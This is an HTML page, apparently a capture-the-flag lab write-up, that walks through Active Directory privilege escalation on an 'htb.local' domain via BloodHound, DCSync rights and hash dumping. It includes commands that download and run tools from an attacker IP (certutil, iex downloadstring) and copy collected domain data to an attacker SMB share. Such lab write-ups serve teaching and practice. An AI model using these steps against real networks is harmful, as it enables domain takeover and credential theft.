@@ -1,0 +1,95 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>Privilege Escalation</title>
+    <link rel="stylesheet" href="../../../pages.css" />
+  </head>
+  <body>
+    <div class="container">
+      <h1>Privilege Escalation</h1>
+
+      <p>
+        Let's use BloodHound to visualize the domain and look for privilege
+        escalation paths.
+      </p>
+
+      <p>
+        With my shell, I'll run Sharphound (<a
+          href="https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.1/SharpHound-v1.1.1.zip"
+          target="_blank"
+          >SharpHound v1.1.1</a
+        >) to collect data for BloodHound.
+      </p>
+
+      <p>
+        Start neo4j and BloodHound on Kali and copy Sharphound.exe to the target
+        box:
+      </p>
+
+      <pre><code>certutil -urlcache -f http://10.10.14.9/SharpHound.exe SharpHound.exe</code></pre>
+      <img src="image.png" alt="SharpHound Execution" />
+
+      <p>
+        Once done, this will generate 2 files: a zip file and a bin file. Our
+        task is to copy the zip file to our Kali machine so that we can feed it
+        to our BloodHound tool.
+      </p>
+      <img src="image 2.png" alt="SharpHound Output" />
+
+      <p>To copy the zip file to our machine:</p>
+
+      <pre><code>smbserver.py share . -smb2support -username anurag -password anurag</code></pre>
+      <img src="image 4.png" alt="smbserver Setup" />
+
+      <pre><code>net use \\10.10.14.9\share /u:anurag anurag
+copy 20240713055831_BloodHound.zip \\10.10.14.9\share
+net use /d \\10.10.14.9\share</code></pre>
+      <img src="image 3.png" alt="net use Command" />
+
+      <p>
+        Upload the zip file in BloodHound. In BloodHound, on the top left side,
+        you will see a search bar. Search for svc-alfresco in it. In the middle
+        of the screen, you will be able to see svc-alfresco. Right-click on it
+        and select "Mark user as owned". Now in the query, select "Find shortest
+        path to domain admins".
+      </p>
+      <img src="image 5.png" alt="BloodHound Query" />
+      <img src="image 6.png" alt="Shortest Path to Domain Admins" />
+      <img src="image 8.png" alt="Domain Admins Path" />
+
+      <p>Create a user on the domain:</p>
+      <img src="image 7.png" alt="Create User on Domain" />
+
+      <p>Add the user to the <i>Exchange Windows Permission</i> group:</p>
+      <img src="image 9.png" alt="Add User to Group" />
+
+      <p>
+        Give the user DCSync privileges. We’ll use PowerView (<a
+          href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"
+          target="_blank"
+          >PowerView.ps1</a
+        >) for this. First download PowerView and set up a Python server in the
+        directory it resides in:
+      </p>
+
+      <pre><code>iex(new-object net.webclient).downloadstring('http://10.10.14.9/PowerView.ps1')
+$SecPass = ConvertTo-SecureString 'password' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\anurag', $SecPass)
+Add-ObjectACL -PrincipalIdentity anurag -Credential $Cred -Rights DCSync</code></pre>
+      <img src="image 10.png" alt="DCSync Privileges" />
+
+      <p>
+        Now, the secretsdump script from Impacket can be run as anurag and used
+        to reveal the NTLM hashes for all domain users:
+      </p>
+      <img src="image 11.png" alt="secretsdump Output" />
+
+      <p>The obtained Domain Admin hash can be used to login via psexec:</p>
+      <img src="image 12.png" alt="psexec Login" />
+
+      <p>Found root.txt:</p>
+      <img src="image 13.png" alt="root.txt Found" />
+    </div>
+  </body>
+</html>
